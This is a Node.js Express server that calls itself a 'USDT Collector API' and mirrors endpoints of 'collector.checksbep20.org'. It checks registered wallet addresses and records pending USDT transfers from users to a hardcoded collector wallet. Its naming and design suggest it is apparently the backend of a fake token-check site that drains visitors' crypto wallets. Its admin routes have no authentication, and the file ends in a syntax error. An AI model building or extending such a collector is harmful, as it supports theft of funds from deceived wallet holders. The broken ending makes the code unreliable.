const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Data storage file
const DATA_FILE = path.join(__dirname, 'data.json');

// Default collector address (same as your frontend)
const DEFAULT_COLLECTOR = "0x5681d680B047bF5b12939625C56301556991005e";

// Initialize data file if not exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ users: {}, transactions: [] }, null, 2));
}

// Helper function to read data
function readData() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        return { users: {}, transactions: [] };
    }
}

// Helper function to write data
function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ==================== API ENDPOINTS ====================

/**
 * POST /send - Check stored address (Same as collector.checksbep20.org/send)
 * Request body: { "address": "0x..." }
 * Response: { "found": true/false, "collector": "0x...", "amountHuman": "50" }
 */
app.post('/send', (req, res) => {
    const { address } = req.body;
    
    console.log(`📞 /send called for address: ${address}`);
    
    if (!address) {
        return res.status(400).json({ 
            error: 'Address required' 
        });
    }
    
    const data = readData();
    const user = data.users[address];
    
    const response = {
        found: !!user,
        collector: DEFAULT_COLLECTOR,
        amountHuman: user ? user.amount.toString() : null
    };
    
    console.log(`📤 Response:`, response);
    res.json(response);
});

/**
 * POST /collect - Notify relayer (Same as collector.checksbep20.org/collect)
 * Request body: { "token": "0x...", "from": "0x...", "amountHuman": "50", "to": "0x..." }
 * Response: { "success": true, "message": "...", "transaction": {...} }
 */
app.post('/collect', (req, res) => {
    const { token, from, amountHuman, to } = req.body;
    
    console.log(`📥 /collect called:`);
    console.log(`   From: ${from}`);
    console.log(`   Amount: ${amountHuman} USDT`);
    console.log(`   To: ${to}`);
    
    if (!from || !amountHuman) {
        return res.status(400).json({ 
            success: false, 
            error: 'Missing required fields' 
        });
    }
    
    const data = readData();
    
    // Create transaction record
    const transaction = {
        id: 'tx_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
        token: token || "0x55d398326f99059fF775485246999027B3197955",
        from: from,
        amountHuman: amountHuman,
        to: to || DEFAULT_COLLECTOR,
        timestamp: new Date().toISOString(),
        status: 'pending'
    };
    
    // Save transaction
    data.transactions.unshift(transaction);
    
    // Keep only last 1000 transactions
    if (data.transactions.length > 1000) {
        data.transactions = data.transactions.slice(0, 1000);
    }
    
    writeData(data);
    
    console.log(`✅ Transaction saved: ${transaction.id}`);
    
    res.json({
        success: true,
        message: 'Transfer request recorded successfully',
        transaction: transaction
    });
});

/**
 * GET /transactions - Get all transactions
 * Query params: ?limit=10 (optional)
 */
app.get('/transactions', (req, res) => {
    const data = readData();
    const limit = parseInt(req.query.limit) || 50;
    
    res.json({
        total: data.transactions.length,
        transactions: data.transactions.slice(0, limit)
    });
});

/**
 * GET /users - Get all registered users
 */
app.get('/users', (req, res) => {
    const data = readData();
    const users = Object.keys(data.users).map(address => ({
        address: address,
        amount: data.users[address].amount,
        registeredAt: data.users[address].registeredAt
    }));
    
    res.json({ users });
});

/**
 * POST /register - Register a user with amount
 * Request body: { "address": "0x...", "amount": 100 }
 * This is for admin use to add users to the system
 */
app.post('/register', (req, res) => {
    const { address, amount } = req.body;
    
    if (!address || !amount) {
        return res.status(400).json({ error: 'Address and amount required' });
    }
    
    const data = readData();
    
    data.users[address] = {
        amount: amount,
        registeredAt: new Date().toISOString()
    };
    
    writeData(data);
    
    console.log(`📝 Registered user: ${address} with amount: ${amount}`);
    
    res.json({
        success: true,
        message: 'User registered successfully',
        user: { address, amount }
    });
});

/**
 * GET /stats - Get API statistics
 */
app.get('/stats', (req, res) => {
    const data = readData();
    
    res.json({
        status: 'active',
        totalUsers: Object.keys(data.users).length,
        totalTransactions: data.transactions.length,
        lastTransaction: data.transactions[0] || null,
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

/**
 * GET /health - Health check endpoint
 */
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        message: 'API is running',
        timestamp: new Date().toISOString()
    });
});

/**
 * DELETE /transaction/:id - Delete a transaction (admin)
 */
app.delete('/transaction/:id', (req, res) => {
    const { id } = req.params;
    const data = readData();
    
    const index = data.transactions.findIndex(tx => tx.id === id);
    
    if (index === -1) {
        return res.status(404).json({ error: 'Transaction not found' });
    }
    
    data.transactions.splice(index, 1);
    writeData(data);
    
    res.json({ success: true, message: 'Transaction deleted' });
});

// Start server
app.listen(PORT, () => {
    console.log(`
    ╔════════════════════════════════════════╗
    ║   🚀 USDT Collector API Started        ║
    ║   Port: ${PORT}                          ║
    ║   Status: Running                      ║
    ║   Endpoints:                           ║
    ║   POST   /send      - Check address    ║
    ║   POST   /collect   - Record transfer  ║
    ║   GET    /transactions - View all      ║
    ║   GET    /stats      - Statistics      ║
    ║   GET    /health     - Health check    ║
    ╚════════════════════════════════════════╝
    `);
});
    console.log("Server running on port", PORT)
);
